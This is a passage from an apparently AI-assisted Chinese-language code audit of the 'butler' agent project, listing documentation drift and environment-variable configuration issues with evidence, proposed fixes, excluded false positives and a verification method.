- CONTRIBUTING.md:135 写"最多 `MAX_EACH` 次"(与文档字符单位冲突)
**建议**: 选一种语义(改为次数 `3` 优先,因为 `each` 是英文次数),字段名 `MAX_EACH` → `MAX_TIMES` 更清晰;统一 CONTRIBUTING.md。

**R7-9 [M] stale_documentation** — README LLM Provider 表与 `transport/providers.py` 不对齐  
**证据**: `README.md:99-106` 列 7 家(Claude/OpenAI/DeepSeek/Qwen/GLM/Moonshot/MiniMax);`butler/transport/providers.py:60-127` 实际注册 9 家(缺 Moonshot,多 openrouter/siliconflow/minimax-cn)。  
**建议**: 用脚本生成 provider 列表(`python -c "from butler.transport.providers import _REGISTRY; print(list(_REGISTRY))"`),或 README 写"完整 9 家见 `providers.py`"。

**R7-10 [M] count_drift** — `v4-architecture.md` "9 核心工具" 与实际注册不符  
**证据**: 
- 文档 `docs/architecture/v4-architecture.md:38, 93` 列 9 工具:read_file/write_file/patch/search_files/list_directory/**skills_list**/**skill_view**/delegate_task/run_workflow
- 代码 `butler/tools/builtin_register.py:62-176` 实际注册 11 工具(差 **delete_file** + **terminal**)
- `v4-architecture.md` 后文也提到 `terminal` + `delete_file`,**自相矛盾**
**建议**: 改"9 核心"为"11 核心";或脚注"delete_file/terminal 受 `BUTLER_ENABLE_TERMINAL=1` 控制,默认仅在 `butler runtime` 路径可见"。

**R7-11 [M] visual_drift** — `STRUCTURE.md` ASCII 树形图 `runtime/ workflows/` 合并错位  
**证据**: `STRUCTURE.md:15` 一行 `├── runtime/ workflows/    #   定时任务、短工作流` — 两个独立顶层目录被错误合并;且后文 `tools/ memory/ skills/ cli/ ops/` 同样把 5 个独立目录堆一行,渲染无法读。  
**建议**: 改用 1 行 1 目录:`├── runtime/        #  定时任务` / `├── workflows/      #  短工作流` / `├── tools/         #  ` 等。

**R7-12 [M] stale_section_ref** — DOCUMENTATION.md 多次引"design.md §11+",但 design.md 只到 §10 + 附录  
**证据**:
- `docs/DOCUMENTATION.md:16` "L5 历史: docs/history/、**design.md §11+**"
- `docs/DOCUMENTATION.md:159` "从 docs/history/ 或 design.md **§11+** 推断当前模块路径"
- `docs/design/design.md` 实际只有:一、系统总览 / 二、核心架构 / 三、分层模型配置 / 四、项目级记忆 / 五、Session 隔离 / 五点五、租户 / 五点六、DAG / 六、压缩协议 / 七、DevAgent / 八、SubAgent / 九、参考系统 / 十、国产模型 / **附录:命令速查**
**建议**: 把 "§11+" 改为 "附录" 或 "§10+ 之后"。

**R7-13 [M] name_drift (双 env 名)** — `BUTLER_OBSERVATION_TTL_DAYS` vs `BUTLER_MEMORY_OBSERVATION_TTL_DAYS`  
**证据**:
- 代码 `butler/memory/observation_store.py:108` 读 `BUTLER_OBSERVATION_TTL_DAYS`,无值时默认 `90`
- 文档 `docs/config/reference.md:287` 列出 `BUTLER_MEMORY_OBSERVATION_TTL_DAYS` 默认 `0`(代码读不到此名,自动 90)
- 同文档 `:482` 又列 `BUTLER_OBSERVATION_TTL_DAYS` 默认 `90`
- **同一文档,同主题,2 个不同 env 名 + 2 个不同默认** — 任一跟随都会得到错行为
**建议**: 删除 `:287` 的 `BUTLER_MEMORY_OBSERVATION_TTL_DAYS` 行,保留 `:482` 为 SSOT;或加注 "合并到 §482 主表"。

**R7-14 [M] name_drift (旧工具名泄漏)** — `tool_guardrails.py` 仍用 `list_runtime_jobs` / `run_runtime_job`  
**证据**:
- `butler/tool_guardrails.py:35, 46` 白名单含旧工具名 `list_runtime_jobs`、`run_runtime_job`
- `butler/main.py:1207-1266` CLI 子命令已改为 `butler runtime {list,run,due,approve,drain-push}`
- `AGENTS.md` 无此旧名引用 — **CLI 改名,内部白名单未同步**
**建议**: grep `list_runtime_jobs` 找是否还有 handler;若已删,清空白名单 + 注释"Sprint 6 起 CLI 改名为 `runtime list/run`"。

**R7-15 [M] drift (脚本演进未同步)** — `butler-five-reports-gate.sh` 与 AGENTS.md 推荐不匹配  
**证据**:
- `AGENTS.md:48` / `CONTRIBUTING.md:81` 推荐作为"P5–P10 守门"
- `scripts/butler-five-reports-gate.sh` 实际仍跑 `test_five_reports_p5.py ... p10.py + test_prompt_eval.py + test_mcp_merge.py`(Sprint 6 时期)
- R6 揭示"五报告"已演进为 **PR-F1–F6** + P5–P10 体系,守门应更广
**建议**: 跑一次 `bash scripts/butler-five-reports-gate.sh` 确认仍能通过;若 PR-F 测试已存在,加入脚本并在脚本头注释列出当前覆盖范围。

**R7-16 [L] tree_drift** — `STRUCTURE.md` 漏列 `butler/cli/` 子目录  
**证据**: `STRUCTURE.md:14-16` 树形图未单列 `cli/`;`butler/cli/` 实际含 16 个文件(slash_commands / sessions_cli / prompt_eval_cli / registry_cli / experiment_cli / mcp_catalog_cli / provider_presets_cli / secrets_cli / skills_registry 等)。  
**建议**: 树形图加 `├── cli/                  #   16 个 CLI 工具注册与子命令`。

**R7-17 [L] number_drift** — v4-architecture.md Agent Loop 行数过期  
**证据**: 
- `docs/architecture/v4-architecture.md:19` "Agent Loop 编排入口 agent_loop.py (~780 行)"
- 同文件 `:50` 又写 "agent_loop.py (~807 行)"
- `wc -l butler/core/agent_loop.py` 实测 **836 行**
- `:46` 注释 "2026-05-31 实测" 已过期
**建议**: 改 `~780` → `~836`,删 `~807` 行,或统一改为"`wc -l` 实测" + 标注日期。

**R7 未确认 / 待复检 (subagent 标)**: 
- `butler/skills/seed_bundled.py` 与 CONTRIBUTING.md "内置技能种子"段对齐情况
- `butler/main.py` 中若干 CLI 旧名(`mcp add --workspace`、`prompt eval --corpus-live-smoke`)在 `docs/guides/five-reports-capabilities-2026-05.md` 是否完全一致
- `docs/history/hermes-phase-bc-plan-archived.md` 引用已不存在的 `butler/hermes/` 目录,是否影响主索引
- `docs/superpowers/{plans,specs}` 仅 git 链接,未深读

**R7 优先级建议** (按修复 ROI):
1. **R7-1** `BUTLER_ONBOARDING_WELCOME` 选默认并对齐(5 分钟)
2. **R7-2/R7-5** 两段整段重写 env 默认(各 20 分钟)
3. **R7-7/R7-8** completion notify 字段名/单位语义统一(15 分钟)
4. **R7-13** 删 `BUTLER_MEMORY_OBSERVATION_TTL_DAYS` 重复行(1 行)
5. **R7-12** §11+ → 附录 改 2 处
6. **R7-11** STRUCTURE.md 树形图重排(15 分钟)
7. **R7-15** 跑 gate 确认仍能通过 + 加 PR-F 覆盖

### R8 — 配置 / feature flag / env 卫生

> 与 R7 重复项: **R8-1 / R8-2 已分别在 R7-4 / R7-8 详细记录**,本节不再重复展开,只作 cross-ref。

**R8-3 [C] dotenv_side_effect (import-time)** — `butler/config.py:16, 22`  
```python
from dotenv import load_dotenv
load_dotenv()  # 顶层 22 行
```
**现象**: 模块 import 时立即读 `.env` 写 `os.environ`。`tests/conftest.py` 的 autouse fixture `monkeypatch.setenv("BUTLER_HOME", ...)` 在 `import butler.config` 之后才运行 — **若仓库根有 `.env` 含 `BUTLER_HOME`,测试的 monkeypatch 生效前 `.env` 值已注入,后续 `os.getenv` 仍读到 .env 旧值**。  
**影响**: 测试与本地 `.env` 状态串扰,排查"为什么这个 test 在我机器上挂"是经典坑。  
**建议**: 改为 `init_dotenv()` 显式函数,由 `main.py` / `gateway/runner.py` 入口调,模块层不副作用;或 `if not os.getenv("PYTEST_CURRENT_TEST"): load_dotenv()` 守护(粗暴但 1 行有效)。

**R8-5 [H] int_unsafe (12+ 处 `int(os.getenv(...))` 无 try/except)** — 关键位置  
**证据**(已 grep 全部 `int(os.getenv(` 出现 30+ 处,无 try 的代表 12+):
- `butler/gateway_settings.py:73` `int(os.getenv("BUTLER_WECHAT_MEDIA_MAX_CHARS", str(inbound.get("max_chars", 3000))))`
- `butler/runtime/failure_tracker.py:25` `max(1, int(os.getenv("BUTLER_RUNTIME_FAIL_ALERT_STREAK", "3")))`
- `butler/transport/provider_health.py:31` `max(2, int(os.getenv("BUTLER_PROVIDER_CIRCUIT_FAILURES", "3")))`
- `butler/delegate/policy.py:32` `int(os.getenv("BUTLER_DELEGATE_MAX_ITERATIONS", "24"))`
- `butler/mcp/config.py:43, 50` `int(os.getenv("BUTLER_MCP_MAX_SERVERS", "3"))` / `BUTLER_MCP_MAX_TOOLS`
- `butler/registry/install_pending.py:33` `int(os.getenv("BUTLER_REGISTRY_PENDING_TTL", "1800"))`
- `butler/registry/hub_index_cache.py:23` `int(os.getenv("BUTLER_REGISTRY_CACHE_TTL", "3600"))`
- `butler/core/tool_selector.py:51` `int(os.getenv("BUTLER_TOOL_SELECTOR_THRESHOLD", "12"))`
- `butler/core/exp_cache.py:35` `int(os.getenv("BUTLER_EXP_CACHE_MAX", "500"))`
- 等 12+ 处

**现象**: 设 `BUTLER_FOO=abc`(非数字)→ `int("abc")` 抛 `ValueError`,**整进程 startup crash**,错误信息指向 `int()` 那一行,运维需"扫所有 30+ 处"猜哪个 env 出错。  
**建议**: 抽 `butler/env_parse.py:int_env(name, default, *, min=None, max=None) -> int` 统一 helper(已存在 `env_truthy`:`env_parse.py:8`,但 int/float 无对应);所有 `int(os.getenv(...))` 替换为 `int_env(...)`,无效值 fallback default + `logger.warning("BUTLER_FOO=abc 无效, 使用默认 N")`。

**R8-6 [H] dead_config (6+ 文档化但代码 0 reader)**  
**证据**(已 grep `os.getenv` 0 命中 + docs/.env.example 各 1 命中):
- `BUTLER_MEMO_MAX_ACTIVE` — 文档有,代码无 reader
- `BUTLER_NOTIFY_URLS` — 文档有,代码无 reader
- `BUTLER_RUNTIME_RUN_CONSISTENCY` — 文档有,代码无 reader
- `BUTLER_RUNTIME_SMOKE_PUSH` — 文档有,代码无 reader
- `BUTLER_SMOKE_DEEPSEEK_MODEL` — 文档有,prod 代码无 reader(`tests/test_real_api_smoke.py` 是 test 路径,不算生产)
- `BUTLER_WORKFLOW_HANDOFF_ONLY` — 文档有,代码无 reader
(subagent 报 13 个,本节选 6 个有 grep 证据的)

**影响**: 运维按文档设值不生效,误以为"已开启",实际是 dead config — 经典 "我们启用了 X 但 Y 还是发生了" 根因。  
**建议**: (a) 删 `docs/config/reference.md` 死行(优先);(b) 改用 `~/.butler/config.yaml` 替代(env-only 不易查 reader);(c) 加 CI 检查:`scripts/check-dead-env.sh` 跑 `for env in $(grep -oE "BUTLER_[A-Z_]+" docs/config/reference.md | sort -u); do grep -q "os.getenv.\"$env\"\|os.getenv.'$env'" butler/ -r || echo "DEAD: $env"; done`。

**R8-7 [H] undocumented_env (7+ env 代码读但文档/.env.example 完全未列)**  
**证据**(已 grep docs 0 命中):
- `butler/gateway/runner.py:45-46` `BUTLER_GATEWAY_HANDLER_SHUTDOWN_GRACE` 默认 `30s` — Gateway shutdown grace period
- `butler/gateway/inbound_idempotency.py:37` `BUTLER_GATEWAY_INFLIGHT_TTL_SEC` — 入站消息去重 TTL
- `butler/registry/skill_service.py:172` `BUTLER_ENV` — "prod 时禁用 auto install"
- `butler/transport/cache_control.py:30` `BUTLER_TRANSPORT_CACHE_CONTROL` — LLM 缓存控制
- `butler/gateway/owner_gate.py:51, 57` `BUTLER_ENV` (R8-8 同源,见下文)
- `butler/hooks/runner.py:394` `BUTLER_HOOK_FAIL_CLOSED` — hook 失败 fail-closed 开关
- `butler/hooks/runner.py:516-519` `BUTLER_HOOK_EVENT/INPUT/TOOL` — 注入子进程,运行时上下文(非配置,见 R8-15)

**影响**: 运维 / 用户无法在生产调参;查默认值只能 `grep` 代码。  
**建议**: 在 `docs/config/reference.md` 末尾加"未文档化 (代码层) env" 附录;`.env.example` 补 6+ 行。

**R8-8 [H] feature_flag_dark (security-relevant 无文档)** — `BUTLER_ENV=prod`  
**证据**: 
- `butler/registry/skill_service.py:172` `if os.getenv("BUTLER_ENV", "").strip().lower() == "prod":` — 注释 "prod 禁用 auto install"
- `butler/gateway/owner_gate.py:51-57` 注释 `Sprint 18-2 SEC-18-2-1: BUTLER_ENV=prod 时禁用 BUTLER_PROJECT_CREATE_OPEN`  
**现象**: `BUTLER_ENV=prod` 是**安全相关的 feature gate**(影响 owner gate / skill install 行为),但**完全无用户文档**;`.env.example` 也无;默认任何值都走"非 prod"路径 — 默认**更松**(auto install 启用)而非更严,违反 secure-by-default。  
**建议**: (a) 必入 `docs/config/security.md`,列出所有 "prod 时禁用 X" 行为;(b) 启动时 `os.getenv("BUTLER_ENV", "")` 不为空但不在 `{"dev", "staging", "prod"}` 白名单时,`logger.warning("BUTLER_ENV=X 未知值, 按 prod 严格路径处理")`。

**R8-9 [M] multi_source_priority_undocumented (env vs yaml)** — `BUTLER_WECHAT_MEDIA_MAX_CHARS`  
**证据**: `butler/gateway_settings.py:73` `max_chars = max(500, int(os.getenv("BUTLER_WECHAT_MEDIA_MAX_CHARS", str(inbound.get("max_chars", 3000)))))`  
**现象**: 默认值取自 yaml `inbound.get("max_chars", 3000)`,**env 优先级高于 yaml**,但未文档化;运维设 env 同时改 yaml,不知道哪个赢。  
**建议**: `docs/config/reference.md` 顶部加"优先级表":**显式 env > .env > config.yaml > 代码默认**;每 env 在表里加"可被 yaml 覆盖?"列。

**R8-10 [M] range_clamp_silent** — `BUTLER_LOOP_BUDGET_WARN_RATIO`  
**证据**: `butler/core/loop_budget_nudge.py:17` `return max(0.5, min(0.95, float(os.getenv("BUTLER_LOOP_BUDGET_WARN_RATIO", "0.75"))))`  
**现象**: 设 `=1.5` 想"无限宽容"被静默截断为 `0.95`,无 warning。设 `=0.1` 想"超严"被静默拉高为 `0.5`。  
**建议**: 越界时 `logger.warning("BUTLER_LOOP_BUDGET_WARN_RATIO=1.5 越界 [0.5, 0.95], 截断为 0.95")`;统一用 `int_env` 类似的 `float_env(name, default, min, max, warn=True)`。

**R8-11 [M] semantic_danger_value** — `BUTLER_RUNTIME_PUSH_COOLDOWN_SECONDS=0` 允许但危险  
**证据**: `butler/runtime/notify.py:31` `max(0.0, float(raw))` — 允许 0,表示"无冷却"  
**风险**: iLink 限流下,0 冷却 → 风暴重试 → 触发 WeChat 二次封禁  
**建议**: `max(1.0, ...)` 给最小防风暴下限;或保持 0 但加 `BUTLER_RUNTIME_PUSH_COOLDOWN=0` 显式 opt-in warning。

**R8-12 [M] default_on_anti_principle** — `BUTLER_HASHLINE_PATCH` 默认 1 (开)  
**证据**: `butler/core/hashline.py:31` `return os.getenv("BUTLER_HASHLINE_PATCH", "1").strip().lower() not in ("0", "false", "no", "off")`  
**现象**: Hashline patch 是相对新的 patch 行为,默认开启;升级旧 workflow 可能受影响但**无 opt-out 提示**。  
**建议**: 改 `default="0"`,发版说明要求显式开;或保持 1 但在 CHANGELOG 标"Sprint X 起 hashline 默认开,旧 patch 风格兼容 by <filename> 兜底"。

**R8-13 [M] env_truthy_inconsistent** — `BUTLER_DESIGN_CONTEXT_INJECT` 不用统一 helper  
**证据**: `butler/core/design_md_sections.py:216` 手写 `os.getenv("BUTLER_DESIGN_CONTEXT_INJECT", "1").strip().lower() not in ("0", "false", "no", "off", "")`,与 `butler/env_parse.py:8 env_truthy()` helper 重复实现。  
**影响**: 两处实现的"假值集合" 不一致(`hashline.py` 不含 `""`,此处含);yaml 加载的 `None` → `str(None)="None"` → 不在元组 → 仍 True,**yaml `null` 静默失效**。  
**建议**: 全文统一调 `env_truthy("BUTLER_DESIGN_CONTEXT_INJECT", default=True)`;helper 内部处理 `None`。

**R8-14 [M] env_empty_string_handling_inconsistent** — `int(os.getenv(name, "0"))` vs `int(os.getenv(name, "") or default)`  
**证据**:
- `butler/core/session_transcript.py:35` `int(os.getenv("BUTLER_SESSION_TRANSCRIPT_MAX_BYTES", "") or _DEFAULT_MAX_BYTES)` — 空字符串 fallback
- `butler/core/preemptive_compact.py:65` `int(os.getenv("BUTLER_PREEMPTIVE_TRUNCATE_BUFFER", "512"))` — 空字符串 `int("")` 抛 `ValueError`
**现象**: 用户显式 `BUTLER_FOO=`(空),有的模块静默 fallback,有的崩;行为不可预测。  
**建议**: `int_env` helper 统一 `raw or default` 语义 + warning。

**R8-15 [L] env_var_naming_misuse** — `BUTLER_HOOK_EVENT/INPUT/TOOL` 是运行时注入非配置  
**证据**: `butler/hooks/runner.py:516-519` `"BUTLER_HOOK_EVENT": str(payload.get("hook_event_name") or rule.event)`,以及 `BUTLER_HOOK_TOOL` / `BUTLER_HOOK_INPUT` 三处,均为 hook 子进程上下文注入,非用户配置。  
**影响**: `grep BUTLER_HOOK_EVENT docs/` 找不到,误以为"未文档化 env"(R8-7 部分归因)。  
**建议**: 前缀改 `BUTLER_HOOK_CTX_*` 显式区分;`docs/config/reference.md` 段 "运行时注入(非配置开关)" 标 `BUTLER_HOOK_CTX_EVENT/TOOL/INPUT` + `BUTLER_HOOK_FAIL_CLOSED`(后者是真配置)。

**R8-16 [L] feature_flag_double_source** — `BUTLER_EXPENSE_ENABLED` config_service + env_toggle 双源  
**证据**: 
- `butler/config_service.py:91` `_register("BUTLER_EXPENSE_ENABLED", "日常", "记账模块", "1")` — 元数据注册
- `butler/tools/expense.py:41` `_store = TenantStore("expenses", env_toggle="BUTLER_EXPENSE_ENABLED")` — `env_toggle=` 直接读 env
**影响**: 同一 env 两个读取路径;`config_service` 启动时把元数据默认值 `os.environ.setdefault` 注入后,expense.py 仍读 `os.getenv`,若 setdefault 在 expense 模块 import 之后才执行,`expense` 看到的是 `os.environ` 注入前状态,导致**关闭失败**。  
**建议**: `config_service._register` 在 startup 时统一 `os.environ.setdefault(KEY, default)`,并在所有工具模块顶部注释"env 由 config_service._bootstrap 注入"。

**R8 排除 (subagent 报但主线程复检后不构成问题)**:
- R8-17 `.env.example 缺 BUTLER_HOME` — **FALSE**: `grep "BUTLER_HOME" .env.example` → `271: # BUTLER_HOME=~/.butler` 已存在。
- R8-4 `load_dotenv` 静默覆盖显式 env — **降级到 M**:`python-dotenv` 默认 `override=False`,**不覆盖已设 env**;R8-4 描述的是 `override=True` 显式调用的行为,而本项目只调 `load_dotenv()`(无 kwargs),所以不构成问题。**保留作为文档改进建议**(`reference.md` 加优先级表)。

**R8 优先级建议** (按修复 ROI):
1. **R8-3** `load_dotenv` 入口化(1 处 1 行,5 分钟) — 防测试串扰
2. **R8-5** 抽 `int_env/float_env` helper + 替换 30+ 处(渐进,可分 sprint)
3. **R8-8** `BUTLER_ENV=prod` 文档化(必做,security-relevant)
4. **R8-6** 删 dead config 6 行(`docs/config/reference.md` grep 后批量删)
5. **R8-7** 补 undocumented env 7 行(`docs/config/reference.md` 末尾附录)
6. **R8-10/R8-11** 越界 warning + 范围下限(每文件 3-5 行)
7. **R8-13** 统一 `env_truthy` 替换(grep `os.getenv.*not in` 改 helper)

## 已排除 / 误报

> subagent 报但主线程复检后**不**视为问题的项。保留作为审计透明性。

### R5 排除
- **R5-20** (runtime/audit.py lock) subagent 自评"路径正确, 非问题"。

### R6 排除
- **R6-9** "schedule/push_queue no tests" — FALSE:`tests/test_runtime_schedule.py` (148 行)、`tests/test_sprint16_tst11_11_runtime_schedule.py` (108 行)、`tests/test_runtime_push_queue.py` (52 行)、`tests/test_push_queue_dedup.py` (23 行) 均存在。
- **R6-16** "hardcoded /tmp/butler" — FALSE:butler/ 源码无 `/tmp/butler` 硬编码;tests/ 端 `tmp_path` 是 pytest fixture (动态),非 hardcoded。
- **R6-18** "error path gap" — 表述过宽,无具体 file:line 证据,无法直接验证;留作方向性观察。
- **R6-20** "fixture scope" — `tests/conftest.py` 主体为 `_isolate_butler_home`(autouse,function 范围,正确);`tests/corpus/conftest.py` 仅 2 个 session-scope fixtures。子代理报告"散布可疑"无具体 file:line,降为风格观察。

### R8 排除
- **R8-17** ".env.example 缺 BUTLER_HOME" — FALSE:`grep "BUTLER_HOME" .env.example` → `271: # BUTLER_HOME=~/.butler` 已存在。
- **R8-4** "load_dotenv 静默覆盖显式 env" — 降级:`python-dotenv` 默认 `override=False`,本项目只调 `load_dotenv()`(无 kwargs),**不覆盖已设 env**;R8-4 描述的是 `override=True` 显式调用的场景,不构成实际问题。**保留作为文档改进**(优先级表)。

### 累计统计
- R1-R8 共 8 轮,147 条 subagent 报告
- 主线程确认 138 条 (93.9%),误报 / 不构成问题 / 降级 7 条 (4.8%) + 2 条与 R7 交叉 (R8-1/2)
- 按严重度(grep 实测):
  - C(critical): 22 条
  - H(high): 46 条
  - M(medium): 50 条
  - L(low): 20 条

## 附:复检方法学

每条 subagent 报告的 issue 复检流程:
1. **文件:行 定位** — `Read` 文件该行段,确认代码确实存在
2. **实际触发条件** — 跑最小复现 (构造输入/调用入口) 验证是否真的会触发
3. **影响范围评估** — 静态分析调用图,确认是否真在 hot path
4. **已有缓解检查** — grep 是否有 caller-level try/except、retry、validation
5. **分类** — 真问题 (写入对应 R 节) / 误报 (写入排除节) / 风格偏好 (不记)
